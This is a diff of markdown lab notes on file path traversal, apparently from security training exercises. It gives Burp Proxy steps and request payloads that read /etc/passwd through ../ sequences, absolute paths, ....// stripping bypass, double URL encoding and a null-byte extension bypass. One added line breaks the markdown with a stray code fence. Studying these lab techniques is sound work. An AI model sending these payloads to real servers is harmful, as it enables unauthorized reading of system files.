@@ -25,8 +25,9 @@ GET /image?filename=../../../../etc/passwd HTTP/1.1
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220502215946.png)
 
 ### File path traversal, traversal sequences blocked with absolute path bypass
-- use absolute path
 ```bash
+
+- use absolute path
 
 Go To: Proxy
 Options
@@ -46,8 +47,9 @@ GET /image?filename=/etc/passwd HTTP/1.1
 ```
 
 ### File path traversal, traversal sequences stripped non-recursively
-- `using ..../ or ....\/`
 ```bash
+
+- `using ..../ or ....\/`
 
 Go To: Proxy
 Options
@@ -57,7 +59,8 @@ Click on "View details"
 
 Forward the proxy twice until you see:
 
-GET /image?filename=53.jpg HTTP/1.
+GET /image?filename=53.jpg HTTP/1.```bash
+
 
 Send to Repeater
 
@@ -67,8 +70,9 @@ GET /image?filename=....//....//....//....//etc/passwd HTTP/1.1
 ```
 
 ### File path traversal, traversal sequences stripped with superfluous URL-decode
-- non-standard URL encoding
 ```bash
+
+- non-standard URL encoding
 
 Go To: Proxy
 Options
@@ -87,8 +91,9 @@ GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
 ```
 
 ### File path traversal, validation of start of path
-- base folder requirement "/var/www/images"
 ```bash
+
+- base folder requirement "/var/www/images"
 
 Go To: Proxy
 Options
@@ -108,8 +113,9 @@ GET /image?filename=/var/www/images/../../../../etc/passwd HTTP/1.1
 ```
 
 ### File path traversal, validation of file extension with null byte bypass
-- if a file extension is expected you may be able to use a null byte prior to said extension to terminate the following extension (similar to a comment at the end of an sql statement)
 ```bash
+
+- if a file extension is expected you may be able to use a null byte prior to said extension to terminate the following extension (similar to a comment at the end of an sql statement)
 
 Go To: Proxy
 Options
